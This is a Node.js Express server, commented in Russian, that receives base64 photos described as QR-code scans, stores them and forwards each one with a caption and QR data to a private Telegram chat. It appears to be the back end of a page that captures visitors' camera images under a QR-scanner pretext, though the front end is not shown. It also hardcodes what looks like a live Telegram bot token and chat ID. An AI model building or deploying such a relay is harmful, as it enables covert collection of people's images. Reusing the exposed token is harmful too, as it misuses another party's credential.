const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// ВАШИ ДАННЫЕ TELEGRAM
const TELEGRAM_TOKEN = '8719063394:AAElsz2JI_Z7pBepZpZ20JNeDzr9F4v5Iic';
const TELEGRAM_CHAT_ID = '8312652652';

// Создаем папку для сохранения фото
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// Настройка middleware
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(__dirname));

// Логирование
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// Проверка Telegram при запуске
console.log('\n🔍 ПРОВЕРКА НАСТРОЕК TELEGRAM:');
console.log('Токен:', TELEGRAM_TOKEN ? '✅ Установлен' : '❌ Не установлен');
console.log('Chat ID:', TELEGRAM_CHAT_ID ? '✅ Установлен' : '❌ Не установлен');

async function testTelegramConnection() {
    try {
        const response = await axios.get(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe`);
        console.log('✅ Telegram бот найден:', response.data.result.username);

        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: '✅ Сервер запущен! Бот готов к работе.'
            });
            console.log('✅ Тестовое сообщение отправлено');
        } catch (sendError) {
            console.log('⚠️ Напишите боту первым: https://t.me/' + response.data.result.username);
        }

    } catch (error) {
        console.error('❌ Ошибка подключения к Telegram API');
    }
}
testTelegramConnection();

// Главная страница
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Эндпоинт для загрузки фото
app.post('/upload-base64', async (req, res) => {
    try {
        const { image, qrData, photoNumber } = req.body;

        if (!image) {
            return res.status(400).json({ error: 'Нет данных изображения' });
        }

        console.log(`\n📸 Получено фото #${photoNumber || '?'}`);

        // Конвертируем base64 в buffer
        const matches = image.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);

        if (!matches || matches.length !== 3) {
            return res.status(400).json({ error: 'Неверный формат изображения' });
        }

        const imageBuffer = Buffer.from(matches[2], 'base64');

        // Генерируем имя файла
        const timestamp = Date.now();
        const filename = `qr_${timestamp}_${photoNumber || 1}.jpg`;

        // Сохраняем локально
        const localPath = path.join(uploadDir, filename);
        fs.writeFileSync(localPath, imageBuffer);
        console.log('💾 Фото сохранено:', filename, `(${Math.round(imageBuffer.length / 1024)} KB)`);

        // Отправляем в Telegram
        let telegramSuccess = false;
        try {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', imageBuffer, {
                filename: filename,
                contentType: 'image/jpeg'
            });
            formData.append('caption', 
                `📸 Сканирование QR-кода\n` +
                `🖼 Фото #${photoNumber || 1}\n` +
                `📅 Время: ${new Date().toLocaleString('ru-RU')}\n` +
                `🔗 Данные: ${qrData || 'не указаны'}`
            );

            const response = await axios.post(
                `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
                formData,
                {
                    headers: formData.getHeaders(),
                    maxContentLength: Infinity,
                    maxBodyLength: Infinity
                }
            );

            if (response.data.ok) {
                console.log('✅ Успешно отправлено в Telegram');
                telegramSuccess = true;
            }

        } catch (telegramError) {
            console.error('❌ Ошибка отправки в Telegram:', telegramError.message);
        }

        res.json({
            success: true,
            message: telegramSuccess ? 'Фото отправлено в Telegram' : 'Фото сохранено локально',
            filename: filename,
            telegram: telegramSuccess,
            local_path: localPath
        });

    } catch (error) {
        console.error('❌ Критическая ошибка:', error);
        res.status(500).json({
            error: 'Ошибка при обработке фото',
            details: error.message
        });
    }
});

// Тестовый эндпоинт
app.get('/test-telegram', async (req, res) => {
    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: `🧪 Тест от сервера\nВремя: ${new Date().toLocaleString('ru-RU')}`
        });

        res.json({
            success: true,
            message: 'Тестовое сообщение отправлено',
            data: response.data
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.response?.data || error.message
        });
    }
});

// Статус Telegram
app.get('/telegram-status', async (req, res) => {
    try {
        const botInfo = await axios.get(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe`);

        let canSend = false;
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendChatAction`, {
                chat_id: TELEGRAM_CHAT_ID,
                action: 'typing'
            });
            canSend = true;
        } catch (e) {
            canSend = false;
        }

        res.json({
            configured: true,
            bot: {
                username: botInfo.data.result.username,
                name: botInfo.data.result.first_name
            },
            chat: {
                id: TELEGRAM_CHAT_ID,
                can_send: canSend
            }
        });
    } catch (error) {
        res.json({
            configured: false,
            error: error.response?.data?.description || error.message
        });
    }
});

// Запуск сервера
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 Сервер запущен на порту ${PORT}`);
    console.log(`📱 Откройте http://localhost:${PORT}`);
    console.log(`📸 Фото будут сохраняться в папку: ${uploadDir}\n`);
});